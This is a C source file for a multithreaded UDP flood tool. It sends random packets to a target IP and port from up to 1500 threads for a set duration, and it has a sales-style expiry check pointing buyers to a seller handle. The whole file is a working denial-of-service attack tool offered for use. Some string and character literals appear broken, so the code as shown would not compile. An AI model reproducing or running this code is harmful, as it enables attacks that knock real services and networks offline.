#define _XOPEN_SOURCE 700
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define PAYLOAD_SIZE 1024
#define EXPIRY_DATE "2095-08-09"

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

int is_expired() {
    struct tm expiry_tm = {0};
    struct tm current_tm = {0};
    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_tm);
    time_t now = time(NULL);
    localtime_r(&now, &current_tm);
    return difftime(mktime(&current_tm), mktime(&expiry_tm)) > 0;
}

void generate_payload(char* payload, int size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.";
    for (int i = 0; i < size - 1; i++)
        payload[i] = charset[rand() % (sizeof(charset) - 1)];
    payload[size - 1] = '';
}

void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];

    generate_payload(payload, PAYLOAD_SIZE);
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) pthread_exit(NULL);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration)
        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>
", argv[0]);
        return 1;
    }

    if (is_expired()) {
        printf("BUY NEW FROM @IPxKINGYT
");
        return 1;
    }

    AttackParams params;
    strcpy(params.ip, argv[1]);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);
    if (thread_count <= 0 || thread_count > 1500) {
        printf("Invalid thread count. Use 1–1500.
");
        return 1;
    }

    pthread_t threads[thread_count];
    printf("Launching on %s:%d for %d seconds with %d threads...
",
           params.ip, params.port, params.duration, thread_count);

    for (int i = 0; i < thread_count; i++)
        pthread_create(&threads[i], NULL, send_payload, &params);
    for (int i = 0; i < thread_count; i++)
        pthread_join(threads[i], NULL);

    printf("Attack finished on %s:%d.
", params.ip, params.port);
    return 0;
}
